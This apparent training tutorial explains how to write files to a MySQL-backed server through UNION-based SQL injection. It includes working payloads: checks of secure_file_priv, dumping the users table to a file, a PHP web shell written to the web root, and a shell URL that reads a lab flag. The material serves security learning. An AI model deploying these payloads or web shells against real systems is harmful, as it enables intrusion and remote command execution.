## **Objective:**

To provide a detailed, step-by-step guide on writing files to a back-end server through SQL injection vulnerabilities, enabling learners to fully understand and reproduce the techniques safely.

## **Introduction to File Writing in Modern DBMSes**

### **a) Explanation of the restrictions on file writing in modern DBMSes**

* Default disabling of file-write functionality
    
* Requirement of certain privileges for DBAs to write files
    

### **b) Importance of checking sufficient rights and DBMS file-writing allowance before attempting to write files**

## **Prerequisites for Writing Files in MySQL**

### **a) User with FILE privilege enabled**

* Explanation of the FILE privilege and its necessity for file writing
    

### **b) MySQL global secure\_file\_priv variable not enabled**

* Definition and purpose of the secure\_file\_priv variable
    
* Impact of different values (empty, specific directory, NULL) on file reading/writing capabilities
    

### **c) Write access to the target location on the back-end server**

* Importance of having proper write permissions for the desired file location
    

## **Checking the secure\_file\_priv Variable**

### **a) Using the SHOW VARIABLES statement in MySQL**

* Syntax: `SHOW VARIABLES LIKE 'secure_file_priv';`
    
* Explanation of the query's purpose
    

### **b) Retrieving the value using a SELECT statement in a UNION injection**

* Location of global variables in the INFORMATION\_SCHEMA database
    
* Structure of the global\_variables table (variable\_name and variable\_value columns)
    
* Constructing the SQL query to retrieve the secure\_file\_priv value
    

```sql

SELECT variable_name, variable_value FROM information_schema.global_variables WHERE variable_name="secure_file_priv"

```

### **c) Adapting the query for a UNION injection payload**

* Adding junk columns to match the total number of columns in the original query
    
* Example payload:
    

```sql

cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -

```

### **d) Interpreting the result and its impact on file reading/writing capabilities**

## **Using SELECT INTO OUTFILE for File Writing**

### **a) Explanation of the SELECT INTO OUTFILE statement**

* Purpose and common use cases (e.g., exporting data from tables)
    
* Syntax: `SELECT ... INTO OUTFILE '...'`
    

### **b) Examples of writing table content to a file**

* Selecting all columns from a table and writing to a file
    

```sql

SELECT * FROM users INTO OUTFILE '/tmp/credentials';

```

* Verifying the file content on the back-end server
    

### **c) Writing arbitrary data to a file using SELECT statements**

* Selecting a string value and writing it to a file
    

```sql

SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';

```

* Verifying the file content and ownership on the back-end server
    

### **d) Tip: Using the FROM\_BASE64() function for advanced file exports, including binary data**

## **Writing Files through SQL Injection**

### **a) Attempting to write a text file to the web root directory**

* Constructing the query to write a test string to a file
    

```sql

SELECT 'file written successfully!' INTO OUTFILE '/var/www/html/proof.txt'

```

* Adapting the query for a UNION injection payload
    

```sql

cn' UNION SELECT 1,'file written successfully!',3,4 INTO OUTFILE '/var/www/html/proof.txt'-- -

cn' union select 1,'test',3,4 into outfile '/tmp/test.txt'-- -
```

* Verifying the file's existence in the web root directory
    

### **b) Finding the web root directory**

* Using LOAD\_FILE to read server configuration files (Apache, Nginx, IIS)
    
* Searching online for possible configuration locations
    
* Running a fuzzing scan to test different potential web roots (Linux and Windows wordlists)
    
* Utilizing server errors to identify the web directory
    

### **c) Writing a PHP web shell**

* Constructing a simple PHP web shell payload
    

```php

<?php system($_REQUEST[0]); ?>

```

* Adapting the UNION injection payload to write the web shell
    

```sql

cn' UNION SELECT "",'<?php system($_REQUEST[0]); ?>',"","" INTO OUTFILE '/var/www/html/shell.php'-- -

```

* Verifying the web shell's existence and functionality by executing commands via the 0 parameter
    

```sql

http://SERVER_IP:PORT/shell.php?0=id

```

* Confirming code execution and identifying the running user (e.g., www-data)
    

```sql
<http://94.237.63.83:49004/shell.php?0=cat+../flag.txt>
```

## **Best Practices and Safety Considerations**

* Always test in a controlled environment to avoid unintended consequences
    
* Use the techniques responsibly and only on systems you have explicit permission to test
    
* Properly secure and clean up any files written during testing
    
* Stay updated on the latest security patches and best practices for preventing SQL injection vulnerabilities
    

## **Checkpoint Exercise**

* Set up a vulnerable MySQL-based web application in a safe testing environment
    
* Attempt to write a text file to the web root using a UNION-based SQL injection payload
    
* Verify the file's existence and content on the back-end server
    
* Write a PHP web shell and confirm code execution by running a basic command
    

## **Conclusion**

* Recap of the key concepts and techniques covered in the guide
    
* Emphasis on the importance of continuous learning and staying updated with the latest security practices
    
* Encouragement to apply the acquired knowledge responsibly and ethically
